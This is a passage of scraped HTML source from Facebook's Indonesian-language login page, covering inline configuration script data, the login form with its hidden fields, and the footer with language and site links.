ServerJS()).handle({"define":[["cr:310",["RunWWW"],{"__rc":["RunWWW",null]},-1],["cr:1078",[],{"__rc":[null,null]},-1],["cr:1080",["unexpectedUseInComet"],{"__rc":["unexpectedUseInComet",null]},-1],["cr:1126",["TimeSliceImpl"],{"__rc":["TimeSliceImpl",null]},-1],["cr:3725",["clearTimeoutWWWOrMobile"],{"__rc":["clearTimeoutWWWOrMobile",null]},-1],["cr:4344",["setTimeoutWWWOrMobile"],{"__rc":["setTimeoutWWWOrMobile",null]},-1],["cr:6108",["CSS"],{"__rc":["CSS",null]},-1],["cr:6640",["PromiseImpl"],{"__rc":["PromiseImpl",null]},-1],["cr:7385",["clearIntervalWWW"],{"__rc":["clearIntervalWWW",null]},-1],["cr:7389",["setIntervalAcrossTransitionsWWW"],{"__rc":["setIntervalAcrossTransitionsWWW",null]},-1],["cr:7391",["setTimeoutAcrossTransitionsWWW"],{"__rc":["setTimeoutAcrossTransitionsWWW",null]},-1],["cr:8958",["FBJSON"],{"__rc":["FBJSON",null]},-1],["cr:8959",["DTSG"],{"__rc":["DTSG",null]},-1],["cr:8960",["DTSG_ASYNC"],{"__rc":["DTSG_ASYNC",null]},-1],["cr:696703",[],{"__rc":[null,null]},-1],["cr:708886",["EventProfilerImpl"],{"__rc":["EventProfilerImpl",null]},-1],["cr:135",["RunBlue"],{"__rc":["RunBlue",null]},-1],["cr:6669",["DataStore"],{"__rc":["DataStore",null]},-1],["URLFragmentPreludeConfig",[],{"hashtagRedirect":true,"fragBlacklist":["nonce","access_token","oauth_token","xs","checkpoint_data","code"]},137],["CookiePrivacySandboxConfig",[],{"is_affected_by_samesite_lax":false},7723],["CometPersistQueryParams",[],{"relative":{},"domain":{}},6231],["CookieDomain",[],{"domain":"facebook.com"},6421],["GetAsyncParamsExtraData",[],{"extra_data":{"__aaid":"0"}},7511],["BootloaderConfig",[],{"deferBootloads":false,"enableLoadingUnavailableResources":true,"enableRetryOnStuckResource":false,"jsRetries":[200,500],"jsRetryAbortNum":2,"jsRetryAbortTime":5,"silentDups":false,"timeout":60000,"tieredLoadingFromTier":100,"hypStep4":false,"phdOn":false,"phdSeparateBitmaps":false,"btCutoffIndex":1833,"fastPathForAlreadyRequired":true,"earlyRequireLazy":false,"enableTimeoutLoggingForNonComet":true,"deferLongTailManifest":true,"lazySoT":false,"csrOn":false,"nonce":"eFKpMBmC","translationRetries":[200,500],"translationRetryAbortNum":3,"translationRetryAbortTime":50},329],["CSSLoaderConfig",[],{"timeout":5000},619],["CookieCoreConfig",[],{"alsfid":{},"c_user":{"t":31536000},"cppo":{"t":86400},"dpr":{"t":604800},"fbl_st":{"t":31536000},"hckd":{},"i_user":{"t":31536000},"locale":{"t":604800},"m_ls":{"t":34560000},"m_pixel_ratio":{"t":604800},"noscript":{},"presence":{"t":2592000},"sfau":{},"usida":{},"vpd":{"t":5184000},"wd":{"t":604800},"wl_cbv":{"t":7776000},"x-referer":{},"x-src":{"t":1}},2104],["CurrentUserInitialData",[],{"ACCOUNT_ID":"0","USER_ID":"0","NAME":"","SHORT_NAME":null,"IS_BUSINESS_PERSON_ACCOUNT":false,"HAS_SECONDARY_BUSINESS_PERSON":false,"IS_FACEBOOK_WORK_ACCOUNT":false,"IS_INSTAGRAM_BUSINESS_PERSON":false,"IS_MESSENGER_ONLY_USER":false,"IS_DEACTIVATED_ALLOWED_ON_MESSENGER":false,"IS_MESSENGER_CALL_GUEST_USER":false,"IS_WORK_MESSENGER_CALL_GUEST_USER":false,"IS_WORKROOMS_USER":false,"APP_ID":"256281040558","IS_BUSINESS_DOMAIN":false},270],["LSD",[],{"token":"AVqLa91_JxQ"},323],["ServerNonce",[],{"ServerNonce":"MjZCP7mBZgPMTrtprF3INd"},141],["SiteData",[],{"server_revision":1024172672,"client_revision":1024172672,"push_phase":"C3","pkg_cohort":"BP:DEFAULT","haste_session":"20264.BP:DEFAULT.2.0...0","pr":1,"manifest_base_uri":"https:\/\/static.xx.fbcdn.net","manifest_origin":null,"manifest_version_prefix":null,"be_one_ahead":false,"is_rtl":false,"is_experimental_tier":false,"is_jit_warmed_up":true,"hsi":"7519799750659299459","semr_host_bucket":"3","bl_hash_version":2,"comet_env":0,"wbloks_env":false,"ef_page":null,"compose_bootloads":false,"spin":4,"__spin_r":1024172672,"__spin_b":"trunk","__spin_t":1750839816,"vip":"31.13.95.1"},317],["SprinkleConfig",[],{"param_name":"jazoest","version":2,"should_randomize":false},2111],["UserAgentData",[],{"browserArchitecture":"32","browserFullVersion":null,"browserMinorVersion":null,"browserName":"Unknown","browserVersion":null,"deviceName":"Unknown","engineName":"Unknown","engineVersion":null,"platformArchitecture":"32","platformName":"Unknown","platformVersion":null,"platformFullVersion":null},527],["PromiseUsePolyfillSetImmediateGK",[],{"www_always_use_polyfill_setimmediate":false},2190],["JSErrorLoggingConfig",[],{"appId":256281040558,"extra":[],"reportInterval":50,"sampleWeight":null,"sampleWeightKey":"__jssesw","projectBlocklist":[]},2776],["DataStoreConfig",[],{"expandoKey":"__FB_STORE","useExpando":true},2915],["CookieCoreLoggingConfig",[],{"maximumIgnorableStallMs":16.67,"sampleRate":9.7e-5,"sampleRateClassic":1.0e-10,"sampleRateFastStale":1.0e-8},3401],["ImmediateImplementationExperiments",[],{"prefer_message_channel":true},3419],["UriNeedRawQuerySVConfig",[],{"uris":["dms.netmng.com","doubleclick.net","r.msn.com","watchit.sky.com","graphite.instagram.com","www.kfc.co.th","learn.pantheon.io","www.landmarkshops.in","www.ncl.com","s0.wp.com","www.tatacliq.com","bs.serving-sys.com","kohls.com","lazada.co.th","xg4ken.com","technopark.ru","officedepot.com.mx","bestbuy.com.mx","booking.com","nibio.no","myworkdayjobs.com","united-united.com","gcc.gnu.org"]},3871],["InitialCookieConsent",[],{"deferCookies":false,"initialConsent":[1,2],"noCookies":false,"shouldShowCookieBanner":false,"shouldWaitForDeferredDatrCookie":false,"optedInIntegrations":["adobe_marketo_rest_api","blings_io_video","chili_piper_api","cloudfront_cdn","giphy_media","google_ads_pixel_frame_legacy","google_ads_pixel_img_legacy","google_ads_pixel_legacy","google_ads_remarketing_tag","google_ads_services","google_analytics_4_tag","google_analytics_img","google_cached_img","google_double_click_loading","google_double_click_redirecting","google_double_click_uri_connect","google_double_click_uri_frame","google_double_click_uri_img","google_fonts","google_fonts_font","google_maps","google_paid_ads_frame","google_paid_ads_img","google_translate","google_universal_analytics_legacy","google_universal_analytics_legacy_img","google_universal_analytics_legacy_script","jio","linkedin_insight","linkedin_insight_img","mapbox_maps_api","medallia_digital_experience_analytics","microsoft_exchange","nytimes_oembed","reachtheworld_s3","soundcloud_oembed","spotify_oembed","spreaker_oembed","ted_oembed","tenor_api","tenor_images","tenor_media","tiktok_oembed","twitter_analytics_pixel","twitter_analytics_pixel_img","twitter_legacy_embed","vimeo_oembed","youtube_embed","youtube_oembed","advertiser_hosted_pixel","airbus_sat","amazon_media","apps_for_office","arkose_captcha","aspnet_cdn","autodesk_fusion","bing_maps","bing_widget","boku_wallet","bootstrap","box","cardinal_centinel_api","chromecast_extensions","cloudflare_cdnjs","cloudflare_datatables","cloudflare_relay","conversions_api_gateway","demandbase_api","digitalglobe_maps_api","dlocal","dropbox","esri_sat","facebook_sdk","fastly_relay","gmg_pulse_embed_iframe","google_ads_conversions_tag","google_drive","google_fonts_legacy","google_hosted_libraries","google_oauth_api","google_oauth_api_v2","google_recaptcha","here_map_ext","hive_streaming_video","iproov","isptoolbox","jquery","js_delivr","kbank","mathjax","meshy","meta_pixel","metacdn","microsoft_excel","microsoft_office_addin","microsoft_onedrive","microsoft_speech","microsoft_teams","mmi_tiles","oculus","open_street_map","paypal_billing_agreement","paypal_oauth_api","payu","payu_india","plaid","platformized_adyen_checkout","plotly","pydata","razorpay","recruitics","rstudio","salesforce_lighting","stripe","team_center","tripshot","trustly_direct_debit_ach","twilio_voice","unifier","unpkg","unsplash_api","unsplash_image_loading","vega","yoti_api","youtube_oembed_api","google_apis","google_apis_scripts","google_img","google_tag","google_uri_frame","google_uri_script"],"hasGranularThirdPartyCookieConsent":true,"exemptedIntegrations":["advertiser_hosted_pixel","airbus_sat","amazon_media","apps_for_office","arkose_captcha","aspnet_cdn","autodesk_fusion","bing_maps","bing_widget","boku_wallet","bootstrap","box","cardinal_centinel_api","chromecast_extensions","cloudflare_cdnjs","cloudflare_datatables","cloudflare_relay","conversions_api_gateway","demandbase_api","digitalglobe_maps_api","dlocal","dropbox","esri_sat","facebook_sdk","fastly_relay","gmg_pulse_embed_iframe","google_ads_conversions_tag","google_drive","google_fonts_legacy","google_hosted_libraries","google_oauth_api","google_oauth_api_v2","google_recaptcha","here_map_ext","hive_streaming_video","iproov","isptoolbox","jquery","js_delivr","kbank","mathjax","meshy","meta_pixel","metacdn","microsoft_excel","microsoft_office_addin","microsoft_onedrive","microsoft_speech","microsoft_teams","mmi_tiles","oculus","open_street_map","paypal_billing_agreement","paypal_oauth_api","payu","payu_india","plaid","platformized_adyen_checkout","plotly","pydata","razorpay","recruitics","rstudio","salesforce_lighting","stripe","team_center","tripshot","trustly_direct_debit_ach","twilio_voice","unifier","unpkg","unsplash_api","unsplash_image_loading","vega","yoti_api","youtube_oembed_api"]},4328],["WebConnectionClassServerGuess",[],{"connectionClass":"EXCELLENT"},4705],["BootloaderEndpointConfig",[],{"retryEnabled":false,"debugNoBatching":false,"maxBatchSize":-1,"endpointURI":"https:\/\/id-id.facebook.com\/ajax\/bootloader-endpoint\/"},5094],["ServerTimeData",[],{"serverTime":1750839816267,"timeOfRequestStart":1750839816216.4,"timeOfResponseStart":1750839816216.4},5943],["BigPipeExperiments",[],{"link_images_to_pagelets":false,"am_page_load_promise_timeout":false,"enable_bigpipe_plugins":false},907],["cr:7730",["getFbtResult"],{"__rc":["getFbtResult",null]},-1],["cr:8906",["goURIWWW"],{"__rc":["goURIWWW",null]},-1],["cr:925100",["RunBlue"],{"__rc":["RunBlue",null]},-1],["cr:7386",["clearTimeoutWWW"],{"__rc":["clearTimeoutWWW",null]},-1],["cr:7390",["setTimeoutWWW"],{"__rc":["setTimeoutWWW",null]},-1],["cr:1003267",["clearIntervalBlue"],{"__rc":["clearIntervalBlue",null]},-1],["cr:896462",["setIntervalAcrossTransitionsBlue"],{"__rc":["setIntervalAcrossTransitionsBlue",null]},-1],["cr:986633",["setTimeoutAcrossTransitionsBlue"],{"__rc":["setTimeoutAcrossTransitionsBlue",null]},-1],["cr:6799",["EventProfilerAdsSessionProvider"],{"__rc":["EventProfilerAdsSessionProvider",null]},-1],["IntlVariationHoldout",[],{"disable_variation":false},6533],["IntlNumberTypeProps",["IntlCLDRNumberType01"],{"module":{"__m":"IntlCLDRNumberType01"}},7027],["AdsManagerReadRegions",[],{"excluded_endpoints":["\/am_tabular","\/ad_limits_insights","\/ads_reporting","\/column_suggestions","\/customaudiences","\/insights","\/reporting","\/edit","\/adspixels"],"excluded_preloaders":["AdsPEInsightsEdgeDataLoaderPreloader","AdsPEInsightsEdgeSummaryDataLoaderPreloader","AdsPEInsightsColumnPresetDataLoaderPreloader","AdsReportBuilderBusinessViewReportPreloader","AdsReportBuilderAdAccountViewReportPreloader","AdsReportBuilderManageUnifiedReportsPreloader"]},7950],["AsyncRequestConfig",[],{"retryOnNetworkError":"1","useFetchStreamAjaxPipeTransport":true},328],["DTSGInitialData",[],{},258],["IntlPhonologicalRules",[],{"meta":{},"patterns":{}},1496],["IntlViewerContext",[],{"GENDER":3,"regionalLocale":null},772],["NumberFormatConfig",[],{"decimalSeparator":",","numberDelimiter":".","minDigitsForThousandsSeparator":4,"standardDecimalPatternInfo":{"primaryGroupSize":3,"secondaryGroupSize":3},"numberingSystemData":null},54],["SessionNameConfig",[],{"seed":"2wa8"},757],["ZeroCategoryHeader",[],{},1127],["ZeroRewriteRules",[],{"rewrite_rules":{},"whitelist":{"\/hr\/r":1,"\/hr\/p":1,"\/zero\/unsupported_browser\/":1,"\/zero\/policy\/optin":1,"\/zero\/optin\/write\/":1,"\/zero\/optin\/legal\/":1,"\/zero\/optin\/free\/":1,"\/about\/privacy\/":1,"\/about\/privacy\/update\/":1,"\/privacy\/explanation\/":1,"\/zero\/toggle\/welcome\/":1,"\/zero\/toggle\/nux\/":1,"\/zero\/toggle\/settings\/":1,"\/fup\/interstitial\/":1,"\/work\/landing":1,"\/work\/login\/":1,"\/work\/email\/":1,"\/ai.php":1,"\/js_dialog_resources\/dialog_descriptions_android.json":0,"\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/":0,"\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/":0,"\/connect\/jsdialog\/MPlatformLikeJSDialog\/":0,"\/qp\/interstitial\/":1,"\/qp\/action\/redirect\/":1,"\/qp\/action\/close\/":1,"\/zero\/support\/ineligible\/":1,"\/zero_balance_redirect\/":1,"\/zero_balance_redirect":1,"\/zero_balance_redirect\/l\/":1,"\/l.php":1,"\/lsr.php":1,"\/ajax\/dtsg\/":1,"\/checkpoint\/block\/":1,"\/exitdsite":1,"\/zero\/balance\/pixel\/":1,"\/zero\/balance\/":1,"\/zero\/balance\/carrier_landing\/":1,"\/zero\/flex\/logging\/":1,"\/tr":1,"\/tr\/":1,"\/sem_campaigns\/sem_pixel_test\/":1,"\/bookmarks\/flyout\/body\/":1,"\/zero\/subno\/":1,"\/confirmemail.php":1,"\/policies\/":1,"\/mobile\/internetdotorg\/classifier\/":1,"\/zero\/dogfooding":1,"\/xti.php":1,"\/zero\/fblite\/config\/":1,"\/hr\/zsh\/wc\/":1,"\/ajax\/bootloader-endpoint\/":1,"\/mobile\/zero\/carrier_page\/":1,"\/mobile\/zero\/carrier_page\/education_page\/":1,"\/mobile\/zero\/carrier_page\/feature_switch\/":1,"\/mobile\/zero\/carrier_page\/settings_page\/":1,"\/aloha_check_build":1,"\/upsell\/zbd\/softnudge\/":1,"\/mobile\/zero\/af_transition\/":1,"\/mobile\/zero\/af_transition\/action\/":1,"\/mobile\/zero\/freemium\/":1,"\/mobile\/zero\/freemium\/redirect\/":1,"\/mobile\/zero\/freemium\/zero_fup\/":1,"\/privacy\/policy\/":1,"\/privacy\/center\/":1,"\/data\/manifest\/":1,"\/cmon":1,"\/cmon\/":1,"\/zero\/minidt\/":1,"\/diagnostics":1,"\/diagnostics\/":1,"\/4oh4.php":1,"\/autologin.php":1,"\/birthday_help.php":1,"\/checkpoint\/":1,"\/contact-importer\/":1,"\/cr.php":1,"\/legal\/terms\/":1,"\/login.php":1,"\/login\/":1,"\/mobile\/account\/":1,"\/n\/":1,"\/remote_test_device\/":1,"\/upsell\/buy\/":1,"\/upsell\/buyconfirm\/":1,"\/upsell\/buyresult\/":1,"\/upsell\/promos\/":1,"\/upsell\/continue\/":1,"\/upsell\/h\/promos\/":1,"\/upsell\/loan\/learnmore\/":1,"\/upsell\/purchase\/":1,"\/upsell\/promos\/upgrade\/":1,"\/upsell\/buy_redirect\/":1,"\/upsell\/loan\/buyconfirm\/":1,"\/upsell\/loan\/buy\/":1,"\/upsell\/sms\/":1,"\/wap\/a\/channel\/reconnect.php":1,"\/wap\/a\/nux\/wizard\/nav.php":1,"\/wap\/appreg.php":1,"\/wap\/birthday_help.php":1,"\/wap\/c.php":1,"\/wap\/confirmemail.php":1,"\/wap\/cr.php":1,"\/wap\/login.php":1,"\/wap\/r.php":1,"\/zero\/datapolicy":1,"\/a\/timezone.php":1,"\/a\/bz":1,"\/bz\/reliability":1,"\/r.php":1,"\/mr\/":1,"\/reg\/":1,"\/registration\/log\/":1,"\/terms\/":1,"\/f123\/":1,"\/expert\/":1,"\/experts\/":1,"\/terms\/index.php":1,"\/terms.php":1,"\/srr\/":1,"\/msite\/redirect\/":1,"\/fbs\/pixel\/":1,"\/contactpoint\/preconfirmation\/":1,"\/contactpoint\/cliff\/":1,"\/contactpoint\/confirm\/submit\/":1,"\/contactpoint\/confirmed\/":1,"\/contactpoint\/login\/":1,"\/preconfirmation\/contactpoint_change\/":1,"\/help\/contact\/":1,"\/survey\/":1,"\/upsell\/loyaltytopup\/accept\/":1,"\/settings\/":1,"\/lite\/":1,"\/zero_status_update\/":1,"\/operator_store\/":1,"\/upsell\/":1,"\/wifiauth\/login\/":1}},1478],["DTSGInitData",[],{"token":"","async_get_token":""},3515],["WebDriverConfig",[],{"isTestRunning":false,"isJestE2ETestRun":false,"isXRequestConfigEnabled":false,"auxiliaryServiceInfo":{},"testPath":null,"originHost":null,"experiments":null},5332],["EventConfig",[],{"sampling":{"bandwidth":0,"play":0,"playing":0,"progress":0,"pause":0,"ended":0,"seeked":0,"seeking":0,"waiting":0,"loadedmetadata":0,"canplay":0,"selectionchange":0,"change":0,"timeupdate":0,"adaptation":0,"focus":0,"blur":0,"load":0,"error":0,"message":0,"abort":0,"storage":0,"scroll":200000,"mousemove":20000,"mouseover":10000,"mouseout":10000,"mousewheel":1,"MSPointerMove":10000,"keydown":0.1,"click":0.02,"mouseup":0.02,"__100ms":0.001,"__default":5000,"__min":100,"__interactionDefault":200,"__eventDefault":100000},"page_sampling_boost":1,"interaction_regexes":{},"interaction_boost":{},"event_types":{},"manual_instrumentation":false,"profile_eager_execution":false,"disable_heuristic":true,"disable_event_profiler":false},1726],["cr:8828",[],{"__rc":[null,null]},-1],["cr:1094907",[],{"__rc":[null,null]},-1],["cr:1183579",["InlineFbtResultImpl"],{"__rc":["InlineFbtResultImpl",null]},-1],["cr:806696",["clearTimeoutBlue"],{"__rc":["clearTimeoutBlue",null]},-1],["cr:807042",["setTimeoutBlue"],{"__rc":["setTimeoutBlue",null]},-1],["FbtResultGK",[],{"shouldReturnFbtResult":true,"inlineMode":"NO_INLINE"},876],["AdsInterfacesSessionConfig",[],{},2393],["FbtQTOverrides",[],{"overrides":{}},551],["AnalyticsCoreData",[],{"device_id":"$^|Acb0-u2pl8mwvzRtZL0prISBVRFo1X3Q6QkV4CHDR7NqQNX2fWyzfBSF7lIIEmAgT4pSrztUsLc6VtKXTPR1aov-s3BvVKb8IQ|fd.AcYfqV23sMxqsgAO5qVFcG9Cj90wcDP4b0LCJTAQkY4oEH89fGR_CbphMvd9MnwnsG5FIRbF4YhTuLQDjnZqVsJd","app_id":"256281040558","enable_bladerunner":false,"enable_ack":true,"push_phase":"C3","enable_observer":false,"enable_cmcd_observer":false,"enable_dataloss_timer":false,"enable_fallback_for_br":true,"queue_activation_experiment":false,"max_delay_br_queue":60000,"max_delay_br_queue_immediate":3,"max_delay_br_init_not_complete":3000,"consents":{},"app_universe":1,"br_stateful_migration_on":true,"enable_non_fb_br_stateless_by_default":false,"use_falco_as_mutex_key":false,"is_intern":false,"enable_session_id_bug_fix":true},5237]],"require":[["markJSEnabled"],["URLFragmentPrelude"],["Primer"],["BigPipe"],["Bootloader"],["TimeSlice"],["AsyncRequest"],["FbtLogging"],["IntlQtEventFalcoEvent"],["RequireDeferredReference","unblock",[],[["AsyncRequest","FbtLogging","IntlQtEventFalcoEvent"],"sd"]],["RequireDeferredReference","unblock",[],[["AsyncRequest","FbtLogging","IntlQtEventFalcoEvent"],"css"]]]});});</script></head><body class="_39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut _-kb _605a b_c3pyn-ahh x1 Locale_id_ID" dir="ltr"><script type="text/javascript" nonce="eFKpMBmC">requireLazy(["bootstrapWebSession"],function(j){j(1750839816)})</script><div class="_li" id="u_0_0_UZ"><div id="globalContainer" class="uiContextualLayerParent"><div class="fb_content clearfix " id="content" role="main"><div class="_4-u5 _30ny"><div class="_97vy"><img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" /></div><div class="_4-u2 _1w1t _4-u8 _52jv"><div class="_xku" id="header_block"><span class="_97w1 _50f6"><div class="_9axz">Login ke Facebook</div></span></div><div class="login_form_container"><form id="login_form" action="/login/device-based/regular/login/?login_attempt=1&amp;lwv=100" method="post"><input type="hidden" name="jazoest" value="2913" autocomplete="off" /><input type="hidden" name="lsd" value="AVqLa91_JxQ" autocomplete="off" /><input type="hidden" autocomplete="off" id="error_box" /><div id="loginform"><input type="hidden" autocomplete="off" id="display" name="display" value="" /><input type="hidden" autocomplete="off" id="isprivate" name="isprivate" value="" /><input type="hidden" autocomplete="off" id="return_session" name="return_session" value="" /><input type="hidden" autocomplete="off" id="skip_api_login" name="skip_api_login" value="" /><input type="hidden" autocomplete="off" id="signed_next" name="signed_next" value="" /><input type="hidden" autocomplete="off" id="trynum" name="trynum" value="1" /><input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_1_1R" /><input type="hidden" autocomplete="off" name="lgndim" value="" id="u_0_2_0n" /><input type="hidden" name="lgnrnd" value="012336_pvXo" /><input type="hidden" id="lgnjs" name="lgnjs" value="n" /><div class="clearfix _5466 _44mg" id="email_container"><input type="text" class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" tabindex="0" placeholder="Email atau Nomor Telepon" value="" autofocus="1" autocomplete="username" aria-label="Email atau Nomor Telepon" /></div><div class="clearfix _5466 _44mg"><div><div class="_55r1 _1kbt"><input type="password" class="inputtext _55r1 inputtext _9npi inputtext _9npi" name="pass" id="pass" tabindex="0" placeholder="Kata Sandi" value="" autocomplete="current-password" aria-label="Kata Sandi" /><div class="_9ls7" id="u_0_3_z9"><a href="#" role="button"><div class="_9lsa"><div class="_9lsb" id="u_0_4_I4"></div></div></a></div></div></div></div><div class="_xkt"><button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="0" type="submit">Masuk</button></div><div id="login_link"><div class="_97w3"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&amp;cancel_lara_pswd=0" class="_97w4" target="">Lupa akun?</a></div><div class="_1rf5"><span class="_1rf8">atau</span></div><div class="_xkt"><a role="button" class="_42ft _4jy0 _16jx _4jy6 _4jy2 selected _51sy" href="/r.php?locale=id_ID&amp;display=page&amp;entry_point=login">Buat akun baru</a></div></div></div><input type="hidden" autocomplete="off" id="prefill_contact_point" name="prefill_contact_point" value="" /><input type="hidden" autocomplete="off" id="prefill_source" name="prefill_source" /><input type="hidden" autocomplete="off" id="prefill_type" name="prefill_type" /><input type="hidden" autocomplete="off" id="first_prefill_source" name="first_prefill_source" /><input type="hidden" autocomplete="off" id="first_prefill_type" name="first_prefill_type" /><input type="hidden" autocomplete="off" id="had_cp_prefilled" name="had_cp_prefilled" value="false" /><input type="hidden" autocomplete="off" id="had_password_prefilled" name="had_password_prefilled" value="false" /><input type="hidden" autocomplete="off" name="ab_test_data" value="" /></form></div></div></div></div><div class=""><div class="_95ke _8opy"><div id="pageFooter" data-referrer="page_footer" data-testid="page_footer"><ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1"><li>Bahasa Indonesia</li><li><a class="_sv4" dir="ltr" href="https://id-id.facebook.com/login/device-based/regular/login/?login_attempt=1" title="Javanese" id="u_0_5_hl">Basa Jawa</a></li><li><a class="_sv4" dir="ltr" href="https://jv-id.facebook.com/login/device-based/regular/login/?login_attempt=1" title="English (UK)" id="u_0_6_mG">English (UK)</a></li><li><a class="_sv4" dir="ltr" href="https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1" title="Malay" id="u_0_7_Y8">Bahasa Melayu</a></li><li><a class="_sv4" dir="ltr" href="https://ms-my.facebook.com/login/device-based/regular/login/?login_attempt=1" title="Japanese" id="u_0_8_OL">日本語</a></li><li><a class="_sv4" dir="rtl" href="https://ja-jp.facebook.com/login/device-based/regular/login/?login_attempt=1" title="Arabic" id="u_0_9_BV">العربية</a></li><li><a class="_sv4" dir="ltr" href="https://ar-ar.facebook.com/login/device-based/regular/login/?login_attempt=1" title="French (France)" id="u_0_a_z2">Français (France)</a></li><li><a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/login/device-based/regular/login/?login_attempt=1" title="Spanish" id="u_0_b_fT">Español</a></li><li><a class="_sv4" dir="ltr" href="https://es-la.facebook.com/login/device-based/regular/login/?login_attempt=1" title="Korean" id="u_0_c_o9">한국어</a></li><li><a class="_sv4" dir="ltr" href="https://ko-kr.facebook.com/login/device-based/regular/login/?login_attempt=1" title="Portuguese (Brazil)" id="u_0_d_Wc">Português (Brasil)</a></li><li><a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/login/device-based/regular/login/?login_attempt=1" title="German" id="u_0_e_f6">Deutsch</a></li><li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fde-de.facebook.com%2Flogin%2Fdevice-based%2Fregular%2Flogin%2F%3Flogin_attempt%3D1&amp;source=www_list_selector_more" href="#" title="Tampilkan bahasa lainnya"><i class="img sp_GPvE0syHYuh sx_8e0301"></i></a></li></ul><div id="contentCurve"></div><div id="pageFooterChildren" role="contentinfo" aria-label="Tautan situs Facebook"><ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i"><li><a href="/reg/" title="Daftar Facebook">Daftar</a></li><li><a href="/login/" title="Masuk ke Facebook">Masuk</a></li><li><a href="https://messenger.com/" title="Coba Messenger.">Messenger</a></li><li><a href="/lite/" title="Facebook Lite untuk Android.">Facebook Lite</a></li><li><a href="https://id-id.facebook.com/watch/" title="Telusuri di Video">Video</a></li><li><a href="https://about.meta.com/technologies/meta-pay" title="Pelajari selengkapnya tentang Meta Pay" target="_blank">Meta Pay</a></li><li><a href="https://www.meta.com/" title="Proses Pembayaran Meta" target="_blank">Meta Store</a></li><li><a href="https://www.meta.com/quest/" title="Pelajari selengkapnya tentang Meta Quest" target="_blank">Meta Quest</a></li><li><a href="https://www.meta.com/smart-glasses/" title="Pelajari selengkapnya tentang Ray-Ban Meta" target="_blank">Ray-Ban Meta</a></li><li><a href="https://www.meta.ai/" title="Meta AI">Meta AI</a></li><li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT2EEfhf8-6RUFQmJZv4allgMsnXlpzc16pwN6EilwpWFVxhh0E94bP2I6fa-dKLUF20KuXoEccYeskPlYt1Q0TCIMuhLEt5Yf1w7rDALlFBxBkPUIO3TlckmL946dTsnFAvwBuRRCkCq8qK" title="Coba Instagram" target="_blank" rel="nofollow" data-lynx-mode="hover">Instagram</a></li><li><a href="https://www.threads.com/" title="Lihat Threads">Threads</a></li><li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="Lihat Pusat Informasi Pemilu">Pusat Informasi Pemilu</a></li><li><a href="/privacy/policy/?entry_point=facebook_page_footer" title="Pelajari bagaimana kami mengumpulkan, menggunakan, dan membagikan informasi untuk mendukung Facebook.">Kebijakan Privasi</a></li><li><a href="/privacy/center/?entry_point=facebook_page_footer" title="Pelajari cara mengelola dan mengontrol privasi Anda di Facebook.">Pusat Privasi</a></li><li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Findonesia.fb.com%2Fpanduan-digital%2F&amp;h=AT1HDqCbAXktLjbnOfpvipBxV4R06OHWVZq1pHLeidVCCUjMfyE3Le0PmGw5AwdDNesuEHwDl8JCXoKc0I4QmXMjx-I2Z-XH_DIQlJPeuUStH-6lyauGKnHPcIj9dFuu2rzNG0D0TYyLMQnw" target="_blank" rel="nofollow" data-lynx-mode="hover">Meta di Indonesia</a></li><li><a href="https://about.meta.com/" accesskey="8" title="Baca blog kami, temukan pusat sumber daya, dan cari peluang kerja.">Tentang</a></li><li><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto" title="Beriklan di Facebook.">Buat Iklan</a></li><li><a href="/pages/create/?ref_type=site_footer" title="Buat halaman">Buat Halaman</a></li><li><a href="https://developers.facebook.com/?ref=pf" title="Buat aplikasi di platform kami.">Developer</a></li><li><a href="/careers/?ref=pf" title="Pastikan langkah karier Anda selanjutnya perusahaan kami yang luar biasa.">Karier</a></li><li><a href="/policies/cookies/" title="Pelajari tentang cookie dan Facebook." data-nocookies="1">Cookie</a></li><li><a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217" title="Pelajari tentang Pilihan Iklan.">Pilihan Iklan<i class="img sp_GPvE0syHYuh sx_7d98b4"></i></a></li><li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="Tinjau ketentuan dan kebijakan kami.">Ketentuan</a></li><li><a href="/help/?ref=pf" accesskey="0" title="Kunjungi Pusat Bantuan kami.">Bantuan</a></li><li><a href="https://www.facebook.com/help/637205020878504" title="Kunjungi Pemberitahuan Pengunggahan Kontak &amp; Non-Pengguna kami.">Pengunggahan Kontak &amp; Non-Pengguna</a></li><li><a accesskey="6" class="accessible_elem" href="/settings" title="Lihat dan edit pengaturan Facebook Anda.">Pengaturan</a></li><li><a accesskey="7" class="accessible_elem" href="/allactivity?privacy_source=activity_log_top_menu" title="Lihat log aktivitas Anda">Log aktivitas</a></li></ul></div><div class="mvl copyright"><div><span> Meta © 2025</span></div></div></div></div></div></div><div></div><span><img src="https://facebook.com/security/hsts-pixel.gif?c=3.2.5" width="0" height="0" style="display:none" /></span></div><div style="display:none"></div>
